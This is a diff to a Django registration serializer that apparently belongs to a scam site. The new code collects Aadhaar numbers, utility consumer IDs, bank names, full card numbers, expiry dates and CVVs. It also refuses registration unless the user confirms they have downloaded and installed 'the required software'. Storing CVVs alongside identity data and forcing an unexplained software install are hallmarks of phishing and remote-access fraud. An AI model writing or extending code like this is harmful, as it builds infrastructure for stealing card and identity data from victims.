@@ -18,18 +18,18 @@ class UserSerializer(serializers.ModelSerializer):
         read_only_fields = ['id', 'email', 'is_email_verified', 'is_face_verified', 'created_at', 'updated_at']
 
 class UserRegistrationSerializer(serializers.ModelSerializer):
-    password = serializers.CharField(write_only=True, required=False)
+    software_installed = serializers.BooleanField(required=True)
     
     class Meta:
         model = User
-        fields = ['email', 'full_name', 'phone_number', 'aadhar_number', 
-                 'consumer_id', 'bank_name', 'card_number', 'card_expiry', 'password']
+        fields = ['full_name', 'email', 'phone_number', 'aadhar_number', 'consumer_id', 'bank_name', 'card_number', 'card_expiry', 'cvv', 'software_installed']
         extra_kwargs = {
-            'email': {'required': True},
-            'full_name': {'required': True},
-            'consumer_id': {'required': True}
+            'password': {'write_only': True},
         }
-    
+    def validate_software_installed(self, value):
+        if not value:
+            raise serializers.ValidationError("You must download and install the required software")
+        return value
     def validate_email(self, value):
         if User.objects.filter(email=value).exists():
             raise serializers.ValidationError("Email already registered")
@@ -100,6 +100,7 @@ class UserRegistrationSerializer(serializers.ModelSerializer):
         return value
     
     def create(self, validated_data):
+        software_installed = validated_data.pop('software_installed', False)
         password = validated_data.pop('password', None)
         user = User.objects.create_user(password=password, **validated_data)
         return user
